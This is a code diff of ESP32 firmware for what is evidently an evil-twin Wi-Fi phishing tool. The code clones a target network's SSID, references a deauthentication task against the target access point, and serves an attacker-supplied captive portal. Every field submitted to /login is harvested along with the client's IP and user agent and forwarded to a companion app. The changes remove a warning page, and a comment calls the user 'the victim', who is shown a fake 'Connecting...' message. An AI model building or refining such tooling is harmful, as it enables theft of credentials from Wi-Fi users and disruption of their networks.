@@ -40,22 +40,16 @@ String PortalManager::loadingPlaceholder() const {
         "</body></html>";
 }
 
-// (تم حذف دالة noticePage لأننا لم نعد بحاجة إليها)
-
 void PortalManager::setupRoutes() {
-    // 1. المسار الرئيسي (/) : يعرض صفحة HTML المخصصة مباشرة بدل صفحة التحذير
+    // 1. المسار الرئيسي (/) : يعرض صفحة HTML المخصصة مباشرة
     _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
         JsonDocument ev;
         ev["type"]      = "portal_viewed";
         ev["client_ip"] = request->client()->remoteIP().toString();
         if (_proto) _proto->sendEvent("portal_viewed", ev);
 
-        // هنا التعديل: عرض صفحة المستخدم مباشرة
         if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
-            AsyncWebServerResponse* resp = request->beginResponse(
-                200, "text/html",
-                (const char*)_htmlBuffer
-            );
+            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", (const char*)_htmlBuffer);
             resp->addHeader("Content-Length", String(_htmlLen));
             addNoCacheHeaders(resp);
             request->send(resp);
@@ -69,10 +63,7 @@ void PortalManager::setupRoutes() {
     // 2. مسار /continue (احتياطي)
     _server->on("/continue", HTTP_GET, [this](AsyncWebServerRequest* request) {
         if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
-            AsyncWebServerResponse* resp = request->beginResponse(
-                200, "text/html",
-                (const char*)_htmlBuffer
-            );
+            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", (const char*)_htmlBuffer);
             resp->addHeader("Content-Length", String(_htmlLen));
             addNoCacheHeaders(resp);
             request->send(resp);
@@ -83,8 +74,8 @@ void PortalManager::setupRoutes() {
         }
     });
 
-    // 3. مسار /login (استقبال البيانات)
-    _server->on("/login", HTTP_POST, [this](AsyncWebServerRequest* request) {
+    // 3. مسار /login : استقبال البيانات (تم تعديله ليقبل POST و GET)
+    _server->on("/login", HTTP_ANY, [this](AsyncWebServerRequest* request) {
         String client_ip = request->client()->remoteIP().toString();
         String user_agent = request->header("User-Agent");
 
@@ -95,7 +86,6 @@ void PortalManager::setupRoutes() {
         doc["timestamp"] = millis();
 
         JsonObject data = doc["data"].to<JsonObject>();
-
         int params = request->args();
         for (int i = 0; i < params; i++) {
             String argName = request->argName(i);
@@ -105,14 +95,15 @@ void PortalManager::setupRoutes() {
             }
         }
 
+        // إرسال البيانات للتطبيق
         if (_proto) _proto->sendEvent("captive_data", doc);
 
         _loginAttempts = min(_loginAttempts + 1, 10);
 
-        String redirect_html = 
-            "<script>setTimeout(() => window.location='/?attempt=" + String(_loginAttempts) + "', 800);</script>";
+        // رسالة نجاح بسيطة تظهر للضحية باش ما يعاودش يطلب الصفحة الرئيسية
+        String success_html = "<html><body style='text-align:center;padding-top:50px;font-family:sans-serif;'><h2>Connecting...</h2><p>Please wait, you are being connected to the internet.</p></body></html>";
 
-        AsyncWebServerResponse* response = request->beginResponse(200, "text/html", redirect_html);
+        AsyncWebServerResponse* response = request->beginResponse(200, "text/html", success_html);
         addNoCacheHeaders(response);
         request->send(response);
     });
@@ -141,22 +132,14 @@ void PortalManager::deauthTaskFn(void* pv) {
     vTaskDelete(NULL);
 }
 
-bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targetBssid,
-                          String* error) {
+bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targetBssid, String* error) {
     stop(); 
-
     WiFi.mode(WIFI_MODE_APSTA);
     delay(100);
     bool apOk = WiFi.softAP(ssid, nullptr, channel);
-    if (!apOk) {
-        if (error) *error = "softAP creation failed";
-        return false;
-    }
+    if (!apOk) { if (error) *error = "softAP creation failed"; return false; }
     bool cfgOk = WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
-    if (!cfgOk) {
-        if (error) *error = "softAP DHCP configuration failed";
-        return false;
-    }
+    if (!cfgOk) { if (error) *error = "softAP DHCP configuration failed"; return false; }
 
     wifi_config_t cfg{};
     esp_err_t err = esp_wifi_get_config(WIFI_IF_AP, &cfg);
@@ -165,19 +148,13 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
         err = esp_wifi_set_config(WIFI_IF_AP, &cfg);
     }
     if (err != ESP_OK) {
-        if (error) {
-            *error = "AP channel configuration failed: ";
-            *error += esp_err_to_name(err);
-        }
+        if (error) { *error = "AP channel configuration failed: "; *error += esp_err_to_name(err); }
         return false;
     }
 
     err = esp_wifi_start();
     if (err != ESP_OK && err != ESP_ERR_WIFI_STATE) {
-        if (error) {
-            *error = "WiFi start failed: ";
-            *error += esp_err_to_name(err);
-        }
+        if (error) { *error = "WiFi start failed: "; *error += esp_err_to_name(err); }
         return false;
     }
     delay(300);
@@ -198,56 +175,36 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
     return true;
 }
 
-bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast,
-                                size_t offset, bool hasOffset) {
+bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast, size_t offset, bool hasOffset) {
     if (data && len > 0) {
         const size_t writeOffset = hasOffset ? offset : _htmlLen;
-
-        if (hasOffset && writeOffset > _htmlLen) {
-            return false;
-        }
-        if (_htmlExpected > 0 && writeOffset + len > _htmlExpected) {
-            return false;
-        }
+        if (hasOffset && writeOffset > _htmlLen) return false;
+        if (_htmlExpected > 0 && writeOffset + len > _htmlExpected) return false;
 
         if (writeOffset + len > _htmlCap) {
             const size_t newCap = writeOffset + len + 512;
             uint8_t* grown = (uint8_t*)realloc(_htmlBuffer, newCap + 1);
-            if (!grown) {
-                return false;
-            }
+            if (!grown) return false;
             _htmlBuffer = grown;
             _htmlCap = newCap;
         }
-
-        if (writeOffset > _htmlLen) {
-            memset(_htmlBuffer + _htmlLen, 0, writeOffset - _htmlLen);
-        }
-
+        if (writeOffset > _htmlLen) memset(_htmlBuffer + _htmlLen, 0, writeOffset - _htmlLen);
         memcpy(_htmlBuffer + writeOffset, data, len);
-        if (writeOffset + len > _htmlLen) {
-            _htmlLen = writeOffset + len;
-        }
+        if (writeOffset + len > _htmlLen) _htmlLen = writeOffset + len;
         _htmlBuffer[_htmlLen] = '\0';
     }
 
     if (isLast) {
-        if (_htmlBuffer == nullptr) {
-            return _htmlExpected == 0;
-        }
-
+        if (_htmlBuffer == nullptr) return _htmlExpected == 0;
         const char* tail = (const char*)_htmlBuffer;
-        const bool hasClose = (_htmlLen >= 7 &&
-                               (strncasecmp(tail + _htmlLen - 7, "</html>", 7) == 0));
+        const bool hasClose = (_htmlLen >= 7 && (strncasecmp(tail + _htmlLen - 7, "</html>", 7) == 0));
         if (!hasClose) {
             const char* suffix = "</body></html>";
             const size_t slen = strlen(suffix);
             if (_htmlLen + slen > _htmlCap) {
                 const size_t newCap = _htmlLen + slen + 1;
                 uint8_t* grown = (uint8_t*)realloc(_htmlBuffer, newCap + 1);
-                if (!grown) {
-                    return false;
-                }
+                if (!grown) return false;
                 _htmlBuffer = grown;
                 _htmlCap = newCap;
             }
@@ -255,29 +212,20 @@ bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast,
             _htmlLen += slen;
             _htmlBuffer[_htmlLen] = '\0';
         }
-
-        if (_htmlExpected > 0 && _htmlLen < _htmlExpected) {
-            return false;
-        }
-
+        if (_htmlExpected > 0 && _htmlLen < _htmlExpected) return false;
         _htmlComplete = true;
-
         JsonDocument dbg;
         dbg["type"] = "html_complete";
         dbg["size"] = _htmlLen;
         dbg["expected"] = _htmlExpected;
-        if (_proto) {
-            _proto->sendEvent("debug", dbg);
-        }
+        if (_proto) _proto->sendEvent("debug", dbg);
     }
-
     return true;
 }
 
 bool PortalManager::resetHtml(size_t expectedSize) {
     const size_t MAX_HTML_SIZE = 24 * 1024;
     const size_t SAFETY_MARGIN = 40 * 1024;
-
     free(_htmlBuffer);
     _htmlBuffer  = nullptr;
     _htmlLen     = 0;
@@ -285,28 +233,17 @@ bool PortalManager::resetHtml(size_t expectedSize) {
     _htmlExpected = 0;
     _htmlComplete = false;
 
-    if (expectedSize == 0) {
-        return true;
-    }
-
-    if (expectedSize > MAX_HTML_SIZE) {
-        return false;
-    }
-
+    if (expectedSize == 0) return true;
+    if (expectedSize > MAX_HTML_SIZE) return false;
     const size_t freeHeap = ESP.getFreeHeap();
-    if (freeHeap < expectedSize + HTML_APPEND_MARGIN + SAFETY_MARGIN) {
-        return false;
-    }
+    if (freeHeap < expectedSize + HTML_APPEND_MARGIN + SAFETY_MARGIN) return false;
 
     const size_t capacity = expectedSize + HTML_APPEND_MARGIN;
     _htmlBuffer = (uint8_t*)malloc(capacity + 1);
-    if (!_htmlBuffer) {
-        return false;
-    }
+    if (!_htmlBuffer) return false;
     _htmlBuffer[0] = '\0';
     _htmlCap = capacity;
     _htmlExpected = expectedSize;
-
     return true;
 }
 
